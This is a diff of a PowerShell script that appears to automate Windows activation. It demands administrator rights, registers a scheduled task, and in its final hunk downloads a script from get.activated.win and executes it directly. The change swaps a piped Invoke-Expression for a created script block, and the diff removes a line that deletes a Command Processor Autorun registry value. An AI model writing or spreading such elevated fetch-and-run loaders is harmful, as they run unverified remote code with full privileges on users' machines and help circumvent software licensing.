@@ -1,7 +1,7 @@
 Add-Type -AssemblyName PresentationFramework
 
 function Show-Status($message) {
-    Write-Host "`r$message" -NoNewline
+    Write-Host "`r$message   " -NoNewline
 }
 
 function Show-ProgressBar($label, $percent) {
@@ -18,17 +18,16 @@ function Download-WithProgress {
     )
 
     Add-Type -AssemblyName System.Net.Http
-    $handler = New-Object System.Net.Http.HttpClientHandler
-    $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
-    $client = New-Object System.Net.Http.HttpClient($handler)
-    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
     $buffer = New-Object byte[] 8192
     $downloaded = $false
 
     foreach ($url in $urls) {
         try {
-            $client.Dispose()
+            $handler = New-Object System.Net.Http.HttpClientHandler
+            $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
             $client = New-Object System.Net.Http.HttpClient($handler)
+            $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
+
             $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).Result
             if (-not $response.IsSuccessStatusCode) { continue }
 
@@ -90,6 +89,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
+Start-Sleep -Milliseconds 500
 Clear-Host
 
 # Define paths
@@ -146,10 +146,11 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 }
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Command Processor' -Name 'Autorun'
+# Inline execution in same window with visual feedback
 Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
 try {
-    Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
+    $scriptBlock = Invoke-RestMethod "https://get.activated.win"
+    Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptBlock))
 } catch {
     Write-Host "Activation failed or was interrupted." -ForegroundColor Red
 }
